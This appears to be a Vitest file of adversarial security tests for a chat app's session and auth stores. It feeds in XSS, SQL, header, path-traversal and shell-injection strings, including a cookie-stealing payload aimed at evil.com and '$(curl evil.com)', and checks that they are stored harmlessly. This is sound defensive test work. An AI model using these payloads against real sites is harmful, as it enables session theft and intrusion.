/**
 * Adversarial Security Tests for frontend/src/app/(app)/layout.tsx
 * 
 * Attack vectors tested:
 * - Malformed session inputs
 * - Oversized payloads  
 * - XSS injection attempts via session titles
 * - Navigation attacks
 * - State corruption
 * - Type confusion
 * - Race conditions
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { useChatShellStore } from '@/stores/chatShellStore';
import { useAuthStore } from '@/stores/authStore';
import type { ChatSession } from '@/lib/api';

// Helper to create fresh store state for each test
const resetChatShellStore = () => {
  useChatShellStore.setState({
    sessions: [],
    activeSessionId: null,
    pinnedSessionIds: new Set(),
    sessionSearch: '',
    isLoadingSessions: false,
    sessionsError: null,
  });
};

const resetAuthStore = () => {
  useAuthStore.setState({
    user: null,
    accessToken: null,
    isAuthenticated: false,
    isLoading: false,
    mustChangePassword: false,
  });
};

// ============================================================================
// MALFORMED INPUT ATTACKS
// ============================================================================

describe('Malformed Session Input Attacks', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should handle session with missing id field gracefully', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // setActiveSession should handle null gracefully
    expect(() => store.setActiveSession(null)).not.toThrow();
    
    // setSessions should handle array with malformed objects
    const malformedSession = { 
      title: 'Test', 
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1 
    } as ChatSession;

    expect(() => store.setSessions([malformedSession])).not.toThrow();
  });

  it('should handle session with non-numeric id (type confusion)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Type confusion: string id where number expected
    const typeConfusedSession = {
      id: '123-456-789', // String instead of number
      title: 'Test Session',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    } as ChatSession;

    // Should not crash
    expect(() => store.setSessions([typeConfusedSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions.length).toBe(1);
    expect(currentState.sessions[0].id).toBe('123-456-789');
  });

  it('should handle session with extremely large id (Number.MAX_SAFE_INTEGER overflow)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Integer overflow attempt
    const overflowSession = {
      id: Number.MAX_SAFE_INTEGER + 1, // Loses precision
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([overflowSession as any])).not.toThrow();
  });

  it('should handle session with NaN id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const nanSession = {
      id: NaN,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([nanSession as any])).not.toThrow();
  });

  it('should handle session with negative id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const negativeSession = {
      id: -1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([negativeSession as any])).not.toThrow();
  });

  it('should handle session with null title', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const nullTitleSession: ChatSession = {
      id: 1,
      title: null,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([nullTitleSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    const filtered = currentState.getFilteredSessions();
    expect(filtered.length).toBe(1);
    expect(filtered[0].title).toBeNull();
  });

  it('should handle session with undefined fields', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Partial session object
    const partialSession = {
      id: 1,
      title: 'Partial'
      // Missing created_at, updated_at, vault_id
    } as ChatSession;

    expect(() => store.setSessions([partialSession])).not.toThrow();
  });

  it('should handle session with invalid date strings', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const invalidDatesSession: ChatSession = {
      id: 1,
      title: 'Test',
      created_at: 'not-a-date',
      updated_at: '0000-00-00T00:00:00Z',
      vault_id: 1
    };

    expect(() => store.setSessions([invalidDatesSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    const groups = currentState.getSessionGroups();
    expect(Array.isArray(groups)).toBe(true);
  });
});

// ============================================================================
// OVERSIZED PAYLOAD ATTACKS
// ============================================================================

describe('Oversized Payload Attacks', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should handle extremely large session title (DoS via memory)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // 1MB title string
    const massiveTitle = 'A'.repeat(1024 * 1024);
    const massiveSession: ChatSession = {
      id: 1,
      title: massiveTitle,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([massiveSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions[0].title.length).toBe(1024 * 1024);
  });

  it('should handle large number of sessions (DoS via array size)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Create 10,000 sessions to test array handling
    const manySessions: ChatSession[] = Array.from({ length: 10000 }, (_, i) => ({
      id: i,
      title: `Session ${i}`,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }));

    expect(() => store.setSessions(manySessions)).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions.length).toBe(10000);
  });

  it('should handle massive search query', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Set up some sessions
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);
    
    // 100KB search query
    const massiveQuery = 'x'.repeat(100 * 1024);
    
    expect(() => store.setSessionSearch(massiveQuery)).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    const filtered = currentState.getFilteredSessions();
    expect(Array.isArray(filtered)).toBe(true);
  });

  it('should handle deeply nested session object', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Circular reference attempt
    const nested: any = {
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };
    nested.self = nested;
    nested.metadata = { nested: { nested: { deep: true } } };

    expect(() => store.setSessions([nested as ChatSession])).not.toThrow();
  });

  it('should handle sessions with extremely long property names', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const longPropSession: any = {
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };
    
    // Add property with very long name
    longPropSession['a'.repeat(1000)] = 'value';

    expect(() => store.setSessions([longPropSession as ChatSession])).not.toThrow();
  });
});

// ============================================================================
// INJECTION ATTACKS
// ============================================================================

describe('XSS/Injection Attack Attempts', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should store script injection in session title without executing', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const xssPayload = '<script>alert("XSS")</script>';
    const xssSession: ChatSession = {
      id: 1,
      title: xssPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    // Store should accept the payload (sanitization is renderer responsibility)
    expect(() => store.setSessions([xssSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions[0].title).toBe(xssPayload);
  });

  it('should store event handler injection in session title', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const eventHandlerPayload = '<img src=x onerror="alert(1)">';
    const eventSession: ChatSession = {
      id: 1,
      title: eventHandlerPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([eventSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions[0].title).toBe(eventHandlerPayload);
  });

  it('should store SVG injection payload', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const svgPayload = '<svg onload="alert(1)"><circle cx="1" cy="1" r="1"/></svg>';
    const svgSession: ChatSession = {
      id: 1,
      title: svgPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([svgSession])).not.toThrow();
  });

  it('should store template literal injection attempt', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const templatePayload = '${alert(1)}${window.location}';
    const templateSession: ChatSession = {
      id: 1,
      title: templatePayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    // Value should be stored as-is
    expect(() => store.setSessions([templateSession])).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions[0].title).toBe(templatePayload);
  });

  it('should store JavaScript URI injection', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const jsUriPayload = 'javascript:alert(1)';
    const jsSession: ChatSession = {
      id: 1,
      title: jsUriPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([jsSession])).not.toThrow();
  });

  it('should store data URI injection', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const dataUriPayload = 'data:text/html,<script>alert(1)</script>';
    const dataSession: ChatSession = {
      id: 1,
      title: dataUriPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([dataSession])).not.toThrow();
  });

  it('should store Unicode escape sequences', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Unicode escape injection
    const unicodePayload = '\u003cscript\u003ealert(1)\u003c/script\u003e';
    const unicodeSession: ChatSession = {
      id: 1,
      title: unicodePayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([unicodeSession])).not.toThrow();
  });

  it('should store null byte injection', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Null byte injection (truncation attack)
    const nullBytePayload = 'Test\u0000<script>alert(1)</script>';
    const nullByteSession: ChatSession = {
      id: 1,
      title: nullBytePayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([nullByteSession])).not.toThrow();
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions[0].title).toBe(nullBytePayload);
  });

  it('should store mixed injection types in search query', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Set some sessions
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    const mixedPayload = '<script>alert("XSS")</script>"; DROP TABLE users;--';
    expect(() => store.setSessionSearch(mixedPayload)).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    const filtered = currentState.getFilteredSessions();
    expect(Array.isArray(filtered)).toBe(true);
  });

  it('should store path traversal attempt in session title', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const pathTraversalPayload = '../../../etc/passwd';
    const pathSession: ChatSession = {
      id: 1,
      title: pathTraversalPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([pathSession])).not.toThrow();
  });

  it('should store HTML comments hiding script', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const hiddenScriptPayload = '<!--<script>alert(1)</script>-->';
    const hiddenSession: ChatSession = {
      id: 1,
      title: hiddenScriptPayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([hiddenSession])).not.toThrow();
  });
});

// ============================================================================
// NAVIGATION ATTACKS
// ============================================================================

describe('Navigation Attack Attempts', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should handle session id with path traversal characters', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // If session id was used in navigation, these could cause issues
    const pathTraversalId = '../admin';
    const manipulatedSession = {
      id: pathTraversalId,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([manipulatedSession as any])).not.toThrow();
  });

  it('should handle session id that looks like URL', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const urlLikeId = 'https://evil.com/steal?t=';
    const urlSession = {
      id: urlLikeId,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([urlSession as any])).not.toThrow();
  });

  it('should handle session id with newlines (header injection attempt)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const headerInjection = 'test\r\nSet-Cookie: evil=value';
    const injectionSession = {
      id: headerInjection,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([injectionSession as any])).not.toThrow();
  });

  it('should handle session id with special shell characters', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const shellChars = '$(curl evil.com)';
    const shellSession = {
      id: shellChars,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([shellSession as any])).not.toThrow();
  });

  it('should handle session id with backticks (command injection)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const cmdInjection = '`id`';
    const cmdSession = {
      id: cmdInjection,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([cmdSession as any])).not.toThrow();
  });
});

// ============================================================================
// BOUNDARY VIOLATIONS
// ============================================================================

describe('Boundary Violation Attacks', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should handle empty string session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const emptyIdSession = {
      id: '',
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([emptyIdSession as any])).not.toThrow();
  });

  it('should handle zero as session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const zeroIdSession = {
      id: 0,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([zeroIdSession as any])).not.toThrow();
  });

  it('should handle boolean false as session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const falseIdSession = {
      id: false,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([falseIdSession as any])).not.toThrow();
  });

  it('should handle undefined session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const undefinedIdSession = {
      id: undefined,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([undefinedIdSession as any])).not.toThrow();
  });

  it('should handle Infinity as session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const infIdSession = {
      id: Infinity,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([infIdSession as any])).not.toThrow();
  });

  it('should handle negative zero as session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const negZeroIdSession = {
      id: -0,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([negZeroIdSession as any])).not.toThrow();
  });

  it('should handle empty array as session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const arrayIdSession = {
      id: [],
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([arrayIdSession as any])).not.toThrow();
  });

  it('should handle object as session id', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const objIdSession = {
      id: { value: 1 },
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    expect(() => store.setSessions([objIdSession as any])).not.toThrow();
  });

  it('should handle empty string search query', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    expect(() => store.setSessionSearch('')).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.getFilteredSessions().length).toBe(1);
  });

  it('should handle whitespace-only search query', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    expect(() => store.setSessionSearch('   ')).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.getFilteredSessions().length).toBe(1);
  });
});

// ============================================================================
// STATE CORRUPTION ATTACKS
// ============================================================================

describe('State Corruption Attacks', () => {
  beforeEach(() => {
    resetChatShellStore();
    resetAuthStore();
  });

  it('should handle mustChangePassword being set to non-boolean', () => {
    resetAuthStore();
    const authStore = useAuthStore.getState();
    
    // Try to set mustChangePassword to truthy non-boolean
    expect(() => authStore.setMustChangePassword('true' as any)).not.toThrow();
    expect(() => authStore.setMustChangePassword(1 as any)).not.toThrow();
    expect(() => authStore.setMustChangePassword({} as any)).not.toThrow();
  });

  it('should handle activeSessionId with type confusion', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    // Set as number (backend type)
    store.setActiveSession(1 as any);
    
    // Get session id as number
    const currentState = useChatShellStore.getState();
    const session = currentState.sessions[0];
    
    // Comparison should handle type difference
    const isActive = currentState.activeSessionId === session.id.toString();
    expect(typeof isActive).toBe('boolean');
  });

  it('should handle rapid state updates (race condition simulation)', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Simulate rapid updates
    for (let i = 0; i < 100; i++) {
      store.setSessions([{
        id: i,
        title: `Session ${i}`,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        vault_id: 1
      }]);
      store.setActiveSession(i.toString());
      store.pinSession(i.toString());
    }

    // Final state should be consistent
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions.length).toBe(1); // Last set wins
    expect(currentState.activeSessionId).toBe('99');
  });

  it('should handle pinnedSessionIds with invalid values', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Add normal session
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    // Pin with invalid values
    expect(() => store.pinSession('')).not.toThrow();
    expect(() => store.pinSession('invalid')).not.toThrow();
    expect(() => store.pinSession('123' as any)).not.toThrow();
  });

  it('should handle sessionsError with HTML content', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const xssError = '<script>alert("error")</script>';
    expect(() => store.setSessionsError(xssError)).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessionsError).toBe(xssError);
  });

  it('should handle sessionsError with SQL error messages', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const sqlError = "SQL Error: ' OR '1'='1";
    expect(() => store.setSessionsError(sqlError)).not.toThrow();
  });

  it('should handle concurrent setSessions calls', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Simulate concurrent updates
    const results: any[] = [];
    for (let i = 0; i < 10; i++) {
      const session = {
        id: i,
        title: `Concurrent ${i}`,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        vault_id: 1
      };
      results.push(session);
    }

    // Last write wins in Zustand
    store.setSessions(results);
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessions.length).toBe(10);
  });
});

// ============================================================================
// ERROR MESSAGE INJECTION
// ============================================================================

describe('Error Message Injection Attacks', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should handle XSS in error message from API', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const xssError = '<img src=x onerror="document.location=\'http://evil.com/steal?c=\'+document.cookie">';
    expect(() => store.setSessionsError(xssError)).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessionsError).toBe(xssError);
  });

  it('should handle stack trace in error message', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const stackTrace = `Error: boom
    at Object.handleRenameSession (http://localhost:3000/app.js:123:45)
    at Object.dispatch (http://localhost:3000/vendor.js:456:78)`;
    expect(() => store.setSessionsError(stackTrace)).not.toThrow();
  });

  it('should handle extremely long error message', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const longError = 'Error: '.repeat(1000);
    expect(() => store.setSessionsError(longError)).not.toThrow();
    
    const currentState = useChatShellStore.getState();
    expect(currentState.sessionsError?.length).toBeGreaterThan(5000);
  });

  it('should handle JSON injection in error message', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const jsonInjection = '{" malicious": true, "admin": true}';
    expect(() => store.setSessionsError(jsonInjection)).not.toThrow();
  });

  it('should handle emoji and special characters in error message', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const emojiError = '💥 🚨 ⚠️ <script>alert("error")</script> 🎉';
    expect(() => store.setSessionsError(emojiError)).not.toThrow();
  });
});

// ============================================================================
// IDENTITY CONFUSION ATTACKS
// ============================================================================

describe('ID Type Confusion Attacks', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should handle comparison between numeric and string IDs', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Backend returns numeric id
    const backendSession: ChatSession = {
      id: 123,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    store.setSessions([backendSession]);
    store.setActiveSession('123'); // Layout uses string

    // These should match
    const currentState = useChatShellStore.getState();
    const session = currentState.sessions[0];
    const comparison = currentState.activeSessionId === session.id.toString();
    expect(comparison).toBe(true);
  });

  it('should handle false equality between types', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const session: ChatSession = {
      id: 123,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    };

    store.setSessions([session]);
    store.setActiveSession('123'); // String
    store.setActiveSession(123 as any); // Number (not coerced)

    const currentState = useChatShellStore.getState();
    expect(currentState.activeSessionId).toBeDefined();
  });

  it('should handle Array.includes with mixed types', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    store.setSessions([{
      id: 1,
      title: 'Test',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    // Pin session
    store.pinSession('1');
    
    const currentState = useChatShellStore.getState();
    const pinned = currentState.getPinnedSessions();
    expect(Array.isArray(pinned)).toBe(true);
  });
});

// ============================================================================
// SECURITY VALIDATION SUMMARY
// ============================================================================

describe('Security Validation Summary', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should validate: All malicious inputs are stored without execution', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Various XSS payloads
    const payloads = [
      '<script>alert(1)</script>',
      'javascript:alert(1)',
      '${alert(1)}',
      '\u003cscript\u003e',
      '<img src=x onerror=alert(1)>',
    ];

    payloads.forEach((payload, i) => {
      store.setSessions([{
        id: i,
        title: payload,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        vault_id: 1
      }]);
      
      const currentState = useChatShellStore.getState();
      expect(currentState.sessions[0].title).toBe(payload);
    });
  });

  it('should validate: Store operations complete without crashing on malformed input', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    const malformedInputs = [
      { id: NaN, title: 'NaN test' },
      { id: Infinity, title: 'Infinity test' },
      { id: -0, title: 'Negative zero test' },
      { id: '', title: 'Empty id test' },
      { id: null as any, title: 'Null id test' },
      { id: undefined as any, title: 'Undefined id test' },
    ];

    malformedInputs.forEach((input, i) => {
      expect(() => store.setSessions([input as any])).not.toThrow();
      expect(() => store.setActiveSession(String(i))).not.toThrow();
      expect(() => store.pinSession(String(i))).not.toThrow();
      expect(() => store.setSessionSearch(`search ${i}`)).not.toThrow();
    });
  });

  it('should validate: No code execution from stored values', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Attempt code execution via template literal
    const templatePayload = '${process.env.API_KEY}';
    store.setSessions([{
      id: 1,
      title: templatePayload,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);

    const currentState = useChatShellStore.getState();
    // Value should be stored as a string, not evaluated
    expect(currentState.sessions[0].title).toBe(templatePayload);
  });
});

// ============================================================================
// NAVIGATION SAFETY VALIDATION
// ============================================================================

describe('Navigation Safety Validation', () => {
  beforeEach(() => {
    resetChatShellStore();
  });

  it('should validate: session ids used in navigation are safely handled', () => {
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    // Add sessions with potentially dangerous IDs
    const dangerousIds = [
      '../admin',
      '../../../etc/passwd',
      'javascript:alert(1)',
      '${malicious}',
      '<script>alert(1)</script>',
    ];

    dangerousIds.forEach((dangerousId, i) => {
      store.setSessions([{
        id: dangerousId as any,
        title: 'Test',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        vault_id: 1
      }]);
      
      store.setActiveSession(String(dangerousId));
      
      const currentState = useChatShellStore.getState();
      // State updates complete without crashing
      expect(currentState.activeSessionId).toBe(String(dangerousId));
    });
  });

  it('should validate: navigation URLs are properly formed', () => {
    // This tests that the navigation in layout.tsx would receive safe session IDs
    resetChatShellStore();
    const store = useChatShellStore.getState();
    
    store.setSessions([{
      id: 1,
      title: 'Test Session',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      vault_id: 1
    }]);
    
    // Get fresh state reference after update
    const currentState = useChatShellStore.getState();
    
    // In layout.tsx, navigation is: navigate(`/chat/${session.id}`)
    // This tests that session.id is safely stringified
    const session = currentState.sessions[0];
    const navPath = `/chat/${session.id}`;
    
    expect(navPath).toBe('/chat/1');
    expect(navPath).not.toContain('<script>');
    expect(navPath).not.toContain('javascript:');
  });
});
